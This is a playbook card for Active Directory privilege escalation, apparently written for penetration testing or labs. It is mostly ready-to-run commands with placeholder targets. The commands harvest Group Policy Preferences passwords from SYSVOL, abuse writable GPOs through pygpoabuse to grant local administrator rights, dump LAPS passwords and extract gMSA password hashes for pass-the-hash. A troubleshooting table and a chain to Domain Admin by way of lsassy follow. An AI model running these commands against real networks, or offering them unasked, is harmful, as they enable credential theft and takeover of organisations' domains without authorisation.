# GPO / SYSVOL / LAPS / gMSA (senior)

Directory rights that land **SYSTEM** or a local admin without a roast.

## When / not

Use after any domain user. Re-check after every hop (new GPOs, new LAPS ACL).
Writable GPO beats another Kerberoast.

## SYSVOL / GPP

```
nxc smb {{DC}} -u {{USER}} -p '{{PASS}}' --spider SYSVOL --pattern .xml
nxc smb {{DC}} -u {{USER}} -p '{{PASS}}' -M gpp_password -M gpp_autologin
impacket-Get-GPPPassword {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}}
```

`cpassword` decrypts offline. Treat the user as owned, BloodHound again.

## Writable GPO → SYSTEM

```
# confirm in BH: GenericWrite / WriteDACL / CreateChild on a GPO
# or gPLink on an OU you write
pip3 install pygpoabuse   # bootstrap.sh
pygpoabuse.py {{DOMAIN}}/{{USER}}:'{{PASS}}' -gpo-id '{GUID}' \
  -command 'net localgroup administrators {{USER}} /add' -dc-ip {{DC}}
```

On-host twin: SharpGPOAbuse. User must **logon / gpupdate** on a machine
that applies that GPO (often the whole domain). Then `nxc smb HOST -u {{USER}}`.

## LAPS

```
# v1
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get search \
  --filter '(ms-Mcs-AdmPwd=*)' --attr dNSHostName,ms-Mcs-AdmPwd
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' -M laps
# v2 (Windows LAPS)
# msLAPS-Password / msLAPS-EncryptedPassword
bloodyAD … get search --filter '(msLAPS-Password=*)' \
  --attr dNSHostName,msLAPS-Password
```

ReadLAPSPassword ACE on an OU → local admin on those hosts → lsassy.

## gMSA

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName,msDS-GroupMSAMembership
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' \
  get object 'GMSA$' --attr msDS-ManagedPassword
nxc ldap {{DC}} -u {{USER}} -p '{{PASS}}' -M gmsa
```

The blob is an NT hash. PTH as `GMSA$`. Principals allowed to read it are
in `msDS-GroupMSAMembership` — check BH if extract fails.

## Fail → next

| Symptom | Next |
| --- | --- |
| spider empty | no GPP. still check GPO ACLs in BH |
| pygpoabuse access denied | you write the **files** in SYSVOL, not the GPC. Try GPT.ini / scheduled task XML by hand only in lab |
| LAPS empty | no LAPS, or you lack the ACE. jorah-style ReadLAPS on an OU |
| gMSA `insufficient access` | you are not in GroupMSAMembership |
| GPO applied, not admin | wrong OU / WMI filter. `gpresult /r` on the host |

## Chain

GPP / LAPS / gMSA → local admin → lsassy → DA session.
Writable GPO → wait one gpupdate → same.
Do not skip this card because roast failed.
